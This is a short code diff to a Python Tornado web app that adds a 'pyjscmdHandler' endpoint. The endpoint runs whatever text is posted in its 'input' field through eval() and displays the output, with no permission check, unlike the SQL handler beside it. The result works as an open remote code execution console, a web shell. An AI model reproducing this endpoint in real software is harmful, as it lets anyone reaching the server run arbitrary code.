@@ -331,3 +331,22 @@ class sqlcmdHandler(web.RequestHandler):
         else:
             self.render('sql_backend.html', result="BEA Warning: Can't access without Permission", history=history,
                         lastsql='')
+
+
+class pyjscmdHandler(web.RequestHandler):
+    def get(self):
+        self.render('cmd.html', input='', output='')
+
+    def post(self):
+        inputs = self.get_body_argument('input', '')
+        result_eval = lambda x: eval(x)
+        try:
+            result_output = result_eval(inputs)
+        except Exception:
+            result_output = "please enter correct Python instruction"
+        self.render('cmd.html', input=inputs, output=result_output)
+
+
+class webHandler(web.RequestHandler):
+    def get(self):
+        self.render('quickatt.html')
